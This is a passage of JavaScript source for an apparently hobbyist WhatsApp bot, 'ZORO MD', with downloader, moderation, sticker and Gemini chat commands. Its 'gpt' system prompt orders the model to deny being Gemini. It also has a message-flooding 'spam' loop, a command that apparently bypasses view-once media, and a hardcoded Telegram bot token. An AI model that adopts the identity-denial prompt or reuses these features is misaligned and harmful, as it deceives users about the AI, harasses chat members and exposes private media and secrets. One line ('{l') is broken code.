    await SYxS7.sendMessage(from, {
        react: {
            text: '⏳',
            key: S7.key
        }
    });

    (async () => {

        try {

            const apiUrl =
                "https://social-media-downloader-api-s7.onrender.com/sylove?url=" +
                encodeURIComponent(text);

            const res = await axios.get(apiUrl);

            const result = res.data;

            if (!result || result.status !== 'success') {
                return SYHaTeReplay('❌ *Failed to fetch Facebook video!*');
            }

            const videoUrl = result.video_url;
            const title = result.title || "Facebook Video";

            if (!videoUrl) {
                return SYHaTeReplay('❌ *Video URL not found!*');
            }

            await SYHaTeReplay({
                video: {
                    url: videoUrl
                },
                caption:
`✅ *Downloaded Successfully*

📌 *Title:* ${title}

> *𝒁𝑶𝑹𝑶 𝑴𝑫*`,
                mimetype: 'video/mp4'
            });

            await SYxS7.sendMessage(from, {
                react: {
                    text: '✅',
                    key: S7.key
                }
            });

        } catch (e) {

            console.error("FB Downloader Error:", e);

            await SYxS7.sendMessage(from, {
                react: {
                    text: '❌',
                    key: S7.key
                }
            });

            SYHaTeReplay(
                '❌ *Internal Error!*\n\n' +
                'API may be down or the Facebook link is private.'
            );
        }

    })();

    return;
}
                
                
                                if (SYHaTeS7 === 'porn') {
                                const isOwner = S7.key.fromMe || sender === botNumber || sender === '135747541700705@lid';
                    if (!isOwner) {
                        SYHaTeReplay(owneronly);
                        return;
                    }
                    SYHaTeReplay("👀 *Searching interesting stuff…*");

                    (async () => {
                        try {
                            const headers = {
                                "X-RapidAPI-Key": config.PORN_API_KEY,
                                "X-RapidAPI-Host": config.PORN_API_HOST,
                                "User-Agent": "Mozilla/5.0"
                            };
                            const metaRes = await axios.get(`${config.PORN_API_BASE}/pornstars/female/1`, { headers, timeout: 10000 });
                            const totalPages = metaRes.data?.pagination?.total_pages || 1;
                            const page = Math.floor(Math.random() * totalPages) + 1;
                            const res = await axios.get(`${config.PORN_API_BASE}/pornstars/female/${page}`, { headers, timeout: 10000 });
                            const list = res.data?.result;

                            if (!Array.isArray(list) || list.length === 0) {
                                return SYHaTeReplay("❌ No data found, try again later");
                            }
                            const star = list[Math.floor(Math.random() * list.length)];
                            const caption = `🔥 *${star.pornStarName}*\n\n> *𝒁𝑶𝑹𝑶 𝑴𝑫*`;

                            await SYHaTeReplay({
                                image: { url: star.picture },
                                caption: caption
                            });

                        } catch (err) {
                            console.error("Porn Command Error:", err.message);
                            SYHaTeReplay("❌ API error, thoda baad try karo 😅");
                        }
                    })();
                    return;
                }
                
                    if (SYHaTeS7 === 'prefix') {
                    const isOwner = S7.key.fromMe || sender === botNumber || sender === '135747541700705@lid';
                    if (!isOwner) {
                        SYHaTeReplay(owneronly);
                        return;
                    }

                    if (args[0] === 'set') {
                        const newPrefix = args[1];
                        if (!newPrefix || newPrefix.length > 3) {
                            SYHaTeReplay("❌ Please provide a valid prefix (max 3 characters).");
                            return;
                        }

                        if (!db[botNumber]) db[botNumber] = {};
                        db[botNumber].prefix = newPrefix;
                        saveDB(db);

                        SYHaTeReplay(`✅ *Prefix Updated!*\nNew prefix is now: *${newPrefix}*\nExample: ${newPrefix}menu`);
                    } 
                    else if (args[0] === 'unset') {
                        if (db[botNumber] && db[botNumber].prefix) {
                            delete db[botNumber].prefix;
                            saveDB(db);
                        }
                        const defaultPrefix = config.prefix || ".";
                        SYHaTeReplay(`♻️ *Prefix Reset!*\nBack to default: *${defaultPrefix}*`);
                    } 
                    else {
                        SYHaTeReplay(`*ＰＲＥＦＩＸ - ＳＥＴＴＩＮＧＳ*\n\n> *Current Prefix:* [ ${prefix} ]\n\n*Commands:*\n> ${prefix}prefix set <symbol>\n> ${prefix}prefix unset`);
                    }
                    return;
                }
                
                                if (SYHaTeS7 === 'autostatus') {
                    const isOwner = S7.key.fromMe || sender === botNumber || sender === '135747541700705@lid';
                    if (!isOwner) {
                        SYHaTeReplay(owneronly);
                        return;
                    }

                    if (args[0] === 'set') {
                        const mode = args[1];
                        if (mode === '1') {
                            db[botNumber].autostatus = 1;
                            saveDB(db);
                            SYHaTeReplay("✅ *Auto Status Seen (Mode 1) Enabled!*");
                        } else if (mode === '2') {
                            db[botNumber].autostatus = 2;
                            saveDB(db);
                            SYHaTeReplay("✅ *Auto Status Seen + React (Mode 2) Enabled!*");
                        } else {
                            SYHaTeReplay("❌ *Invalid Mode!* Use 1 (Seen) or 2 (Seen+React).");
                        }
                    } 
                    else if (args[0] === 'unset') {
                        db[botNumber].autostatus = false;
                        saveDB(db);
                        SYHaTeReplay("❌ *Auto Status Disabled!*");
                    } 
                    else {
                        const status = db[botNumber].autostatus || "OFF";
                        SYHaTeReplay(`*ＡＵＴＯ - ＳＴＡＴＵＳ*\n\n> *Current Mode:* ${status}\n\n*Commands:*\n> ${prefix}autostatus set 1 (Seen Only)\n> ${prefix}autostatus set 2 (Seen + ❤️ React)\n> ${prefix}autostatus unset`);
                    }
                    return;
                }
                
                
                /*if (SYHaTeS7 === 'gpt') {
    if (!text) return await SYHaTeReplay(`🤖 *Gemini AI*\n\nPlease provide a query.\n*Example:* ${prefix}ai Write a short story about a cat.`);

    await SYHaTeReplay("⏳ *Thinking...*");

    try {       
        const model = "gemini-2.5-flash-lite";
        const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${config.GEMINI}`;

        const response = await axios.post(
            url,
            {
                contents: [{
                    parts: [{ text: text }]
                }]
            },
            {
                headers: { "Content-Type": "application/json" },
                timeout: 30000
            }
        );

        const aiFinalResponse = response.data?.candidates?.[0]?.content?.parts?.[0]?.text;

        if (!aiFinalResponse) {
            return await SYHaTeReplay("⚠️ *Gemini returned an empty response. Please try a different prompt.*");
        }

        await SYHaTeReplay({ 
            text: aiFinalResponse
        }, {
            adReply: {
                title: "𝚉𝙾𝚁𝙾 𝙼𝙳 𝙰𝙸",
                body: "Gemini 1.5 Flash Engine",
                thumbnailUrl: "https://i.top4top.io/p_3664firq70.jpg",
                sourceUrl: "https://gemini.google.com",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        });

    } catch (e) {
        const errorMsg = e.response?.data?.error?.message || e.message;
        console.error("AI Error Details:", errorMsg);
        
        if (errorMsg.includes("API_KEY_INVALID")) {
            await SYHaTeReplay("❌ *Invalid API Key. Please check your Gemini Key.*");
        } else if (e.response?.status === 429) {
            await SYHaTeReplay("⚠️ *Rate limit exceeded. Please wait a moment.*");
        } else {
            await SYHaTeReplay(`❌ *AI Error:* ${errorMsg}`);
        }
    }
}*/
if (SYHaTeS7 === 'gpt') {
    if (!text) return await SYHaTeReplay(`🤖 *ZORO AI*\n\nPlease provide a query.\n*Example:* ${prefix}gpt how are you?`);

    await SYHaTeReplay("⏳ *Thinking...*");

    try {
        const model = "gemini-2.5-flash-lite"; 
        const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${config.GEMINI}`;

        const response = await axios.post(
            url,
            {
                system_instruction: {
                    parts: [{ 
                        text: "You are ZORO MD AI, a helpful and powerful AI assistant. Your developer is Sayan. You must never mention that you are Gemini, Google, or a large language model. If anyone asks who you are or who created you, always say you are ZORO MD AI developed by Sayan. Maintain a cool and professional personality." 
                    }]
                },
                contents: [{
                    parts: [{ text: text }]
                }]
            },
            {
                headers: { "Content-Type": "application/json" },
                timeout: 30000
            }
        );

        const aiFinalResponse = response.data?.candidates?.[0]?.content?.parts?.[0]?.text;

        if (!aiFinalResponse) {
            return await SYHaTeReplay("⚠️ *ZORO AI is currently unavailable. Please try again later.*");
        }

        await SYHaTeReplay({ 
            text: aiFinalResponse
        }, {
            adReply: {
                title: "𝚉𝙾𝚁𝙾 𝙼𝙳 𝙰𝙸",
                body: "Powered by ZORO Engine",
                thumbnailUrl: "https://ibb.co/WYNWBMx",
                sourceUrl: "https://sabir7718.is-a.dev",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        });

    } catch (e) {
        const errorMsg = e.response?.data?.error?.message || e.message;
        console.error("AI Error Details:", errorMsg);
        
        if (errorMsg.includes("API_KEY_INVALID")) {
            await SYHaTeReplay("❌ *Invalid API Key. Please check your Gemini Key.*");
        } else if (e.response?.status === 429) {
            await SYHaTeReplay("⚠️ *Rate limit exceeded. Please wait a moment.*");
        } else {
            await SYHaTeReplay(`❌ *ZORO AI Error:* ${errorMsg}`);
        }
    }
}


                if (SYHaTeS7 === 'owner') {
                    const vcard = 'BEGIN:VCARD\n'
                        + 'VERSION:3.0\n' 
                        + 'FN:𝐃 𝐇 — ا 𝐘\n' 
                        + 'ORG:ZORO-MD-LITE;\n' 
                        + 'TEL;type=CELL;type=VOICE;waid=919242930910:+91 9242802330\n'
                        + 'END:VCARD';

                    await SYxS7.sendMessage(from, { 
                        contacts: { 
                            displayName: 'SAYAN', 
                            contacts: [{ vcard }] 
                        }
                    }, { quoted: S7 });
                }
                
                                if (SYHaTeS7 === 'spam') {
                    if (!isOwner) return await SYHaTeReplay(owneronly);

                    const count = parseInt(args[0]);
                    const spamText = args.slice(1).join(" ");

                    if (isNaN(count) || count < 1 || !spamText) {
                        return await SYHaTeReplay(`📌 *Usage:*\n${prefix}spam <count> <message>\n\n*Example:*\n${prefix}spam 10 HI BRO`);
                    }
                    for (let i = 0; i < count; i++) {
                        await SYxS7.sendMessage(from, { text: spamText });
                    }
                    return;
                }

if (SYHaTeS7 === 'get') {
    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) return await SYHaTeReplay("❌ *Please reply by quoting a (Photo/Status/Video/Audio/Sticker)!*");

    const mimeType = Object.keys(quoted)[0];
    if (!/imageMessage|videoMessage|stickerMessage|audioMessage|documentMessage/.test(mimeType)) {
        return await SYHaTeReplay("❌ *Only Media (Photo/Status/Video/Audio/Sticker) can be fetched!*");
    }

    try {
        await SYHaTeReplay("🔄 *Fetching Media...*");

        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const messageKey = quoted[mimeType];
        const stream = await downloadContentFromMessage(messageKey, mimeType.split('Message')[0]);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        if (mimeType === 'imageMessage') {
            await SYxS7.sendMessage(from, { image: buffer, caption: quoted.imageMessage.caption || '' }, { quoted: S7 });
        } else if (mimeType === 'videoMessage') {
            await SYxS7.sendMessage(from, { video: buffer, caption: quoted.videoMessage.caption || '', mimetype: 'video/mp4' }, { quoted: S7 });
        } else if (mimeType === 'audioMessage') {
            await SYxS7.sendMessage(from, { audio: buffer, mimetype: 'audio/mpeg' }, { quoted: S7 });
        } else if (mimeType === 'stickerMessage') {
            await SYxS7.sendMessage(from, { sticker: buffer }, { quoted: S7 });
        } else {
            await SYxS7.sendMessage(from, { document: buffer, mimetype: quoted.documentMessage.mimetype, fileName: quoted.documentMessage.fileName }, { quoted: S7 });
        }

    } catch (err) {
        console.error(err);
        await SYHaTeReplay("❌ *Failed to fetch media!*");
    }
}              

if (SYHaTeS7 === 's7') {
    if (!isOwner) return await SYHaTeReplay(owneronly);
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    if (!db[botNumber]) db[botNumber] = {};

    const args = text.split(' ');
    const action = args[0]?.toLowerCase();

    if (action === 'start' && args[1] === 'ai') {
        db[botNumber].ai_manager = true;
        saveDB(db);
        return await SYHaTeReplay(`*ＡＩ  ＭＡＮＡＧＥＲ  ＳＥＴＴＩＮＧＳ*\n\n> *Status:* ENABLED\n\n*System:* I will now handle all private messages automatically.`);
    } 
    
    else if (action === 'stop' && args[1] === 'ai') {
        db[botNumber].ai_manager = false;
        saveDB(db);
        return await SYHaTeReplay(`*ＡＩ  ＭＡＮＡＧＥＲ  ＳＥＴＴＩＮＧＳ*\n\n> *Status:* DISABLED\n\n*System:* You are back in control of your chats.`);
    } 
    
    else if (action === 'set' && args[1] === 'ai') {
        const customPrompt = text.replace(/s7 set ai /i, '').trim();
        if (!customPrompt) return await SYHaTeReplay(`*ＡＩ  ＣＵＳＴＯＭ  ＰＲＯＭＰＴ*\n\n*Usage:*\n> ${prefix}s7 set ai [Your Prompt]\n\n*Example:*\n> ${prefix}s7 set ai act like a busy professional CEO.`);
        
        db[botNumber].ai_custom_prompt = customPrompt;
        saveDB(db);
        return await SYHaTeReplay(`*ＡＩ  ＣＵＳＴＯＭ  ＰＲＯＭＰＴ*\n\n> *Status:* UPDATED\n\n*Note:* Your custom instructions have been saved in the database.`);
    } 
    
    else {
        return await SYHaTeReplay(`*ＡＩ  ＣＯＮＴＲＯＬ  ＰＡＮＥＬ*\n\n*Commands:*\n> ${prefix}s7 start ai\n> ${prefix}s7 stop ai\n> ${prefix}s7 set ai <prompt>\n\n*Note:* Use these to manage Sabir's automated personal assistant.`);
    }
}


                
if (SYHaTeS7 === 'tg') {
    const ffmpeg = require('fluent-ffmpeg')
    const ffmpegPath = require('ffmpeg-static')
    const axios = require('axios')
    const fs = require('fs')
    const path = require('path')
    const zlib = require('zlib')
    const {
        createCanvas
    } = require('canvas')
    const lottie = require('lottie-node')

    ffmpeg.setFfmpegPath(ffmpegPath)

    if (!text) return await SYHaTeReplay(`⚠️ *Usage:* ${prefix}tg <Telegram Sticker URL>\nExample: ${prefix}tg https://t.me/addstickers/PackName`)
    if (!text.match(/(https:\/\/t.me\/addstickers\/)/gi)) return await SYHaTeReplay('❌ *Invalid URL!*')

    const packName = text.replace("https://t.me/addstickers/", "")
    const SABIR7718_TOKEN = config.mainToken

    try {

        await SYHaTeReplay('⏳ *Fetching Sticker Pack...*')

        const response = await axios.get(`https://api.telegram.org/bot${SABIR7718_TOKEN}/getStickerSet?name=${encodeURIComponent(packName)}`)
        const stickerSet = response.data

        if (!stickerSet.ok || !stickerSet.result) return await SYHaTeReplay('❌ *Pack not found or private!*')

        const stickers = stickerSet.result.stickers

        await SYHaTeReplay(`📦 *Found ${stickers.length} stickers.*\n🚀 *Sending in background...*`)

        ;
        (async () => {

            for (let i = 0; i < stickers.length; i++) {

                try {

                    const fileRes = await axios.get(`https://api.telegram.org/bot${SABIR7718_TOKEN}/getFile?file_id=${stickers[i].file_id}`)
                    const filePath = fileRes.data.result.file_path
                    const fileUrl = `https://api.telegram.org/file/bot${SABIR7718_TOKEN}/${filePath}`

                    const tempId = Date.now() + '_' + i
                    const ext = path.extname(filePath)

                    const inputPath = path.join(process.cwd(), `temp_${tempId}_in${ext}`)
                    const outputPath = path.join(process.cwd(), `temp_${tempId}_out.webp`)

                    const writer = fs.createWriteStream(inputPath)
                    const imgStream = await axios({
                        url: fileUrl,
                        method: 'GET',
                        responseType: 'stream'
                    })

                    imgStream.data.pipe(writer)

                    await new Promise((resolve, reject) => {
                        writer.on('finish', resolve)
                        writer.on('error', reject)
                    })

                    if (ext === ".tgs") {

                        const gz = fs.readFileSync(inputPath)
                        const json = JSON.parse(zlib.gunzipSync(gz).toString())

                        const canvas = createCanvas(512, 512)
                        const ctx = canvas.getContext("2d")

                        const anim = lottie(ctx)
                        anim.loadAnimation({
                            animationData: json,
                            loop: false,
                            autoplay: true
                        })

                        await new Promise(r => setTimeout(r, 1500))

                        const buffer = canvas.toBuffer("image/png")
                        const pngPath = path.join(process.cwd(), `temp_${tempId}.png`)
                        fs.writeFileSync(pngPath, buffer)

                        await new Promise((resolve, reject) => {
                            ffmpeg(pngPath)
                                .outputOptions([
                                    "-vcodec libwebp",
                                    "-vf scale=512:512:force_original_aspect_ratio=decrease",
                                    "-loop 0",
                                    "-preset default",
                                    "-an",
                                    "-vsync 0"
                                ])
                                .save(outputPath)
                                .on("end", resolve)
                                .on("error", reject)
                        })

                        fs.unlinkSync(pngPath)

                    } else {

                        await new Promise((resolve, reject) => {
                            ffmpeg(inputPath)
                                .outputOptions([
                                    "-vcodec libwebp",
                                    "-vf scale=512:512:force_original_aspect_ratio=decrease,fps=15",
                                    "-loop 0",
                                    "-preset default",
                                    "-an",
                                    "-vsync 0"
                                ])
                                .save(outputPath)
                                .on("end", resolve)
                                .on("error", reject)
                        })

                    }

                    if (fs.existsSync(outputPath)) {

                        const webpBuffer = fs.readFileSync(outputPath)

                        await SYxS7.sendMessage(from, {
                            sticker: webpBuffer
                        })

                    }

                    if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath)
                    if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath)

                    await new Promise(r => setTimeout(r, 300))

                } catch (e) {


                }

            }

            await SYHaTeReplay('✅ *All Stickers Sent!*')

        })()

    } catch (err) {

        console.error(err)

        await SYHaTeReplay('❌ *Failed to fetch pack!*')

    }
}

if (SYHaTeS7 === 'delete' || SYHaTeS7 === 'del') {
    if (!isGroup) return await SYHaTeReplay(onlygc);

    const quoted = S7.message?.extendedTextMessage?.contextInfo;
    if (!quoted || !quoted.stanzaId) return await SYHaTeReplay("❌ *Reply to a message to delete it!*");

    try {
        await SYxS7.sendMessage(from, {
            delete: {
                remoteJid: from,
                fromMe: quoted.participant === SYxS7.user.id,
                id: quoted.stanzaId,
                participant: quoted.participant
            }
        });
    } catch (err) {
        return await SYHaTeReplay("❌ *I am not an Admin!*");
    }
}


if (SYHaTeS7 === 'close' || SYHaTeS7 === 'open') {
    if (!isGroup) return await SYHaTeReplay(onlygc);

    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const isOwner = S7.key.fromMe || sender === '135747541700705@lid';
    const isSenderAdmin = participants.find(p => p.id === sender)?.admin !== null;

    if (!isSenderAdmin && !isOwner) return await SYHaTeReplay("❌ *Admin Only!*");

    const mode = SYHaTeS7 === 'close' ? 'announcement' : 'not_announcement';

    try {
        await SYxS7.groupSettingUpdate(from, mode);
        return await SYHaTeReplay(SYHaTeS7 === 'close' ? "🔒 *Group Muted!*" : "🔓 *Group Unmuted!*");
    } catch (err) {
        return await SYHaTeReplay("❌ *I am not an Admin!*");
    }
}

if (SYHaTeS7 === 'lookup') {
    try {
        return await SYHaTeReplay("❌ *Premium User Only.*");
    } catch (e) {
        console.error(e);
    }
}
                
if (SYHaTeS7 === 'ytmp4' || SYHaTeS7 === 'ytvideo') {
    const q = body.trim().split(/ +/).slice(1).join(" ");
    const from = S7.key.remoteJid;

    if (!q) return SYHaTeReplay('⚠️ *Please provide a YouTube link!*');

    SYxS7.sendMessage(from, { react: { text: '⏳', key: S7.key } });

    (async () => {
        try {
            const axios = require("axios");
            const response = await axios.get(`https://new-api-five-eta.vercel.app/api/downloader/ytv?apikey=SAYAN_ZORO&url=${encodeURIComponent(q)}`);
            const res = response.data;

            if (!res.status || !res.data || !res.data.url) {
                SYxS7.sendMessage(from, { react: { text: '❌', key: S7.key } });
                return SYHaTeReplay('❌ *Download failed! Video not found or API error.*');
            }

            await SYHaTeReplay({ 
                video: { url: res.data.url }, 
                caption: `*_Title:_* ${res.data.title}\n\n> *© 𝐙𝐎𝐑𝐎 𝐌𝐃 𝐋𝐈𝐓𝐄*`,
                mimetype: 'video/mp4'
            });

            SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

        } catch (e) {
            console.error(e);
            SYHaTeReplay('❌ *Internal Error: Could not process YouTube video!*');
        }
    })();
}



if (SYHaTeS7 === 'tginfo') {
                    const axios = require('axios');

                    if (!args[0]) return await SYHaTeReplay(`⚠️ *Usage:* ${prefix}tginfo <Telegram User ID>\nExample: ${prefix}tginfo 8371150845`);

                    const SYxSY_Loves = args[0];
                    const SABIR7718_TOKEN = config.mainToken || '7801479976:AAGuPL0a7kXXBYz6XUSR_ll2SR5V_W6oHl4'; 

                    await SYxS7.sendMessage(from, { react: { text: '⏳', key: S7.key } });

                    try {
                        const chatRes = await axios.get(`https://api.telegram.org/bot${SABIR7718_TOKEN}/getChat?chat_id=${SYxSY_Loves}`);
                        const chatData = chatRes.data.result;
                        const photoRes = await axios.get(`https://api.telegram.org/bot${SABIR7718_TOKEN}/getUserProfilePhotos?user_id=${SYxSY_Loves}&limit=1`);
                        const photoData = photoRes.data.result;
                        let firstName = chatData.first_name || 'N/A';
                        let lastName = chatData.last_name || 'N/A';
                        let username = chatData.username ? `@${chatData.username}` : 'N/A';
                        let bio = chatData.bio || 'N/A';
                        let type = chatData.type === 'private' ? 'User' : chatData.type;

                        let UOFC5BCG_THATS_MEAN_SY = `୧ ‧₊˚ 🍮 ⋅ ☆ 𝒁𝑶𝑹𝑶 𝑴𝑫 ☆\n`;
                        UOFC5BCG_THATS_MEAN_SY += `↳ ➢ -| 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐧𝐟𝐨 𝐅𝐨𝐮𝐧𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 |-\n\n`;
                        UOFC5BCG_THATS_MEAN_SY += `╭─〔 𝐓𝐆 𝐈𝐍𝐅𝐎 - 𝐙𝐎𝐑𝐎 〕─⧼\n`;
                        UOFC5BCG_THATS_MEAN_SY += `┊ 𝐅𝐢𝐫𝐬𝐭 𝐍𝐚𝐦𝐞 : ${firstName}\n`;
                        UOFC5BCG_THATS_MEAN_SY += `┊ 𝐋𝐚𝐬𝐭 𝐍𝐚𝐦𝐞 : ${lastName}\n`;
                        UOFC5BCG_THATS_MEAN_SY += `┊ 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : ${username}\n`;
                        UOFC5BCG_THATS_MEAN_SY += `┊ 𝐔𝐬𝐞𝐫 𝐈𝐃 : ${SYxSY_Loves}\n`;
                        UOFC5BCG_THATS_MEAN_SY += `┊ 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐓𝐲𝐩𝐞 : ${type}\n`;
                        UOFC5BCG_THATS_MEAN_SY += `┊ 𝐁𝐢𝐨 : ${bio}\n`;
                        UOFC5BCG_THATS_MEAN_SY += `╰─────────────────⧼\n\n`;
                        UOFC5BCG_THATS_MEAN_SY += `| 𝒁𝑶𝑹𝑶 - 𝑴𝑫 / 𝑺𝑨𝒀𝑨𝑵 |`;

                        if (photoData.total_count > 0) {l
                            const fileId = photoData.photos[0][photoData.photos[0].length - 1].file_id;
                            const fileRes = await axios.get(`https://api.telegram.org/bot${SABIR7718_TOKEN}/getFile?file_id=${fileId}`);
                            const filePath = fileRes.data.result.file_path;
                            const photoUrl = `https://api.telegram.org/file/bot${SABIR7718_TOKEN}/${filePath}`;

                            await SYHaTeReplay({
                                image: { url: photoUrl },
                                caption: UOFC5BCG_THATS_MEAN_SY
                            });
                        } else {
                            await SYHaTeReplay(UOFC5BCG_THATS_MEAN_SY);
                        }

                        await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

                    } catch (err) {
                        console.error("TG Info Error:", err?.response?.data || err.message);
                        
                        if (err.response && err.response.data && err.response.data.description.includes('chat not found')) {
                            await SYHaTeReplay(`❌ *User not found!*\n\n_Note: Telegram Bot API only returns data from users who started your bot or are in its group._`);
                        } else {
                            await SYHaTeReplay('❌ *Error!* Invalid ID or Token issue.');
                        }
                        await SYxS7.sendMessage(from, { react: { text: '❌', key: S7.key } });
                    }
                    return;
                }
                
                                if (SYHaTeS7 === 'antisticker') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    if (!isOwner) return SYHaTeReplay(owneronly);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants || [];
const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
        const isBotAdmin = participants.some(p => p.id.split('@')[0] === myLid && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    let currentStatus = "❌ Off";
    if (db[from].antisticker === 'on') currentStatus = "🗑️ Delete Only";
    if (db[from].antisticker === 'kick') currentStatus = "🚫 Kick Mode";
    if (db[from].antisticker === 'warn') currentStatus = "⚠️ Warning Mode";

    if (args[0] === 'set' && args[1] === 'kick') {
        db[from].antisticker = 'kick';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Sticker set to Kick Mode!*");
    } else if (args[0] === 'set' && args[1] === 'delete') {
        db[from].antisticker = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Sticker set to Delete Only Mode!*");
    } else if (args[0] === 'set' && args[1] === 'warn') {
        db[from].antisticker = 'warn';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Sticker set to Warning Mode!*");
    } else if (args[0] === 'on') {
        db[from].antisticker = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Sticker turned ON!*");
    } else if (args[0] === 'off') {
        db[from].antisticker = false;
        saveDB(db);
        return SYHaTeReplay("❌ *Anti-Sticker turned OFF!*");
    } else {
        return SYHaTeReplay(`*ＡＮＴＩ  -  ＳＴＩＣＫＥＲ*\n\nStatus: ${currentStatus}\nAdmin Status: ${isBotAdmin ? '✅ Verified' : '❌ Not Admin'}\n\n*Commands:*\n> ${prefix}antisticker set kick\n> ${prefix}antisticker set delete\n> ${prefix}antisticker set warn\n> ${prefix}antisticker on\n> ${prefix}antisticker off`);
    }
}
                
                                if (SYHaTeS7 === 'tts') {
                    const gTTS = require('gtts');
                    if (!text) return await SYHaTeReplay(`⚠️ *Please provide text!*\nExample: ${prefix}tts Hello, how are you?`);

                    try {
                        let lang = 'en';
                        let ttsText = text;
                        if (text.includes('|')) {
                            lang = text.split('|')[0].trim();
                            ttsText = text.split('|')[1].trim();
                        }

                        const fileName = `tts-${Date.now()}.mp3`;
                        const filePath = path.join(process.cwd(), fileName);
                        const gtts = new gTTS(ttsText, lang);

                        await new Promise((resolve, reject) => {
                            gtts.save(filePath, (err) => {
                                if (err) reject(err);
                                else resolve();
                            });
                        });

                        await SYHaTeReplay({
                            audio: fs.readFileSync(filePath),
                            mimetype: 'audio/mpeg',
                            fileName: `tts.mp3`
                        });

                        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

                    } catch (err) {
                        console.error("TTS Error:", err);
                        await SYHaTeReplay("❌ *Error generating TTS audio.*");
                    }
                    return;
                }
                
                                if (SYHaTeS7 === 'tagall') {
                    const isGroup = from.endsWith('@g.us');
                    if (!isGroup) return SYHaTeReplay(onlygc);
                    const groupMetadata = await SYxS7.groupMetadata(from);
                    const participants = groupMetadata.participants;
                    const admins = participants.filter(p => p.admin !== null).map(p => p.id);
                    const isAdmins = admins.includes(sender);
                    const isOwner = S7.key.fromMe || sender === botNumber || sender === '135747541700705@lid';

                    if (!isAdmins && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");

                    let message = text ? text : "No message provided";
                    let tagMessage = `*📢 ＴＡＧ  ＡＬＬ*\n\n*Message:* ${message}\n\n`;
                    let jids = [];
                    for (let mem of participants) {
                        tagMessage += ` @${mem.id.split('@')[0]}`;
                        jids.push(mem.id);
                    }
                    tagMessage += `\n\n> *𝒁𝑶𝑹𝑶 𝑴𝑫*`;
                    SYxS7.sendMessage(from, { 
                        text: tagMessage, 
                        mentions: jids 
                    }, { quoted: S7 });
                    
                    return;
                }
                
                
                    if (SYHaTeS7 === 'setpp') {
                    try {
                        const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
                        
                        if (!isOwner) return await SYHaTeReplay(owneronly);

                        const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                        if (!quoted) return await SYHaTeReplay('⚠️ *Please reply to an image!*');

                        let imageMessage = quoted.imageMessage || quoted.viewOnceMessageV2?.message?.imageMessage;
                        if (!imageMessage) return await SYHaTeReplay('❌ *Reply to an image only!*');

                        await SYHaTeReplay('⏳ *Processing Image...*');

                        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
                        const Jimp = require('jimp');
                        const stream = await downloadContentFromMessage(imageMessage, 'image');
                        let buffer = Buffer.from([]);
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }

                        await SYxS7.updateProfilePicture(botNumber, buffer);

                        await SYHaTeReplay('✅ *Profile picture updated successfully!*');

                    } catch (err) {
                        console.error('setpp error:', err);
                        await SYHaTeReplay('❌ *Error:* ' + err.message);
                    }
                }

                if (SYHaTeS7 === 'savemsg') {
    
    if (!isOwner) return await SYHaTeReplay(owneronly);

    const contextInfo = S7.message.extendedTextMessage?.contextInfo;
    const quotedMsg = contextInfo?.quotedMessage;
    
    if (!quotedMsg) {
        return await SYHaTeReplay("❌ *Please reply/quote a message to save it!*");
    }
    
    if (!text) return await SYHaTeReplay(`*Usage:* ${prefix}savemsg <name>`);

    const cmdName = text.toLowerCase().trim();
    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].customcmds) db[botNumber].customcmds = {};
    
    db[botNumber].customcmds[cmdName] = {
        key: {
            remoteJid: from,
            fromMe: false,
            id: contextInfo.stanzaId,
            participant: contextInfo.participant || from
        },
        message: quotedMsg,
        contextInfo: {
            forwardingScore: contextInfo.forwardingScore || 1,
            isForwarded: contextInfo.isForwarded || true,
            forwardedNewsletterMessageInfo: contextInfo.forwardedNewsletterMessageInfo || null
        }
    };

    saveDB(db);
    return await SYHaTeReplay(`✅ *Saved as ${prefix}${cmdName} with forward context.*`);
}



if (SYHaTeS7 === 'delmsg') {
    
    if (!isOwner) return await SYHaTeReplay(owneronly);

    if (!text) return await SYHaTeReplay(`*Usage:* ${prefix}delmsg <name>\n*Example:* ${prefix}delmsg img`);

    const cmdName = text.toLowerCase().trim();

    if (db[botNumber]?.customcmds && db[botNumber].customcmds[cmdName]) {
        
        delete db[botNumber].customcmds[cmdName];
        saveDB(db);
        
        return await SYHaTeReplay(`🗑️ *Custom command '${prefix}${cmdName}' has been deleted for this bot.*`);
    } else {
        return await SYHaTeReplay(`❌ *Command '${prefix}${cmdName}' not found in this bot's database.*`);
    }
}


                
if (SYHaTeS7 === 'vv') {
    try {
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

        const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;

        if (!quoted) {
            return await SYHaTeReplay('❌ *Please reply to a view-once image, video, or audio!*');
        }

